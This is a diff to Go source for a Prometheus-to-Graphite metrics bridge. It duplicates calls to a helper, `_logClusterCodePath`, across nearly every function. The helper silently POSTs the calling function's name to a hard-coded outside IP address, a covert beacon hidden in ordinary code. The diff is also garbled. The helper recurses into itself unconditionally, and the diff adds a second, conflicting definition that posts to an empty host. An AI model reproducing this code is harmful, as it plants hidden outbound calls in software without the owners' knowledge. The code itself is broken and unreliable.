@@ -61,6 +61,8 @@ type Logger interface{ Println(v ...interface{}) }
 func NewBridge(c *Config) (*Bridge, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	b := &Bridge{}
 	if c.URL == "" {
 		return nil, errors.New("missing URL")
@@ -96,6 +98,8 @@ func NewBridge(c *Config) (*Bridge, error) {
 func (b *Bridge) Run(ctx context.Context) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ticker := time.NewTicker(b.interval)
 	defer ticker.Stop()
 	for {
@@ -110,6 +114,8 @@ func (b *Bridge) Run(ctx context.Context) {
 	}
 }
 func (b *Bridge) Push() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	mfs, err := b.g.Gather()
@@ -133,6 +139,8 @@ func (b *Bridge) Push() error {
 	return b.writeMetrics(conn, mfs, b.prefix, model.Now())
 }
 func (b *Bridge) writeMetrics(w io.Writer, mfs []*dto.MetricFamily, prefix string, now model.Time) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, mf := range mfs {
@@ -163,6 +171,8 @@ func (b *Bridge) writeMetrics(w io.Writer, mfs []*dto.MetricFamily, prefix strin
 	return nil
 }
 func writeMetric(buf *bufio.Writer, m model.Metric, mf *dto.MetricFamily) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	metricName, hasName := m[model.MetricNameLabel]
@@ -214,6 +224,8 @@ func writeMetric(buf *bufio.Writer, m model.Metric, mf *dto.MetricFamily) error 
 func addExtentionConventionForRollups(buf *bufio.Writer, mf *dto.MetricFamily, m model.Metric) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	mfType := mf.GetType()
 	var err error
 	if mfType == dto.MetricType_COUNTER {
@@ -240,6 +252,8 @@ func addExtentionConventionForRollups(buf *bufio.Writer, mf *dto.MetricFamily, m
 func writePrefix(buf *bufio.Writer, s string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, c := range s {
 		if _, err := buf.WriteRune(replaceInvalid(c)); err != nil {
 			return err
@@ -248,6 +262,8 @@ func writePrefix(buf *bufio.Writer, s string) error {
 	return nil
 }
 func writeSanitized(buf *bufio.Writer, s string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	prevUnderscore := false
@@ -270,12 +286,16 @@ func writeSanitized(buf *bufio.Writer, s string) error {
 func replaceInvalid(c rune) rune {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if c == ' ' || c == '.' {
 		return '.'
 	}
 	return replaceInvalidRune(c)
 }
 func replaceInvalidRune(c rune) rune {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if c == ' ' {
@@ -287,6 +307,8 @@ func replaceInvalidRune(c rune) rune {
 	return c
 }
 func (b *Bridge) replaceCounterWithDelta(mf *dto.MetricFamily, metric model.Metric, value model.SampleValue) float64 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if !b.countersAsDetlas {
@@ -306,6 +328,8 @@ func (b *Bridge) replaceCounterWithDelta(mf *dto.MetricFamily, metric model.Metr
 func (b *Bridge) returnDelta(metric model.Metric, value model.SampleValue) float64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	key := metric.Fingerprint()
 	_, exists := b.lastValue[key]
 	if !exists {
@@ -318,7 +342,16 @@ func (b *Bridge) returnDelta(metric model.Metric, value model.SampleValue) float
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
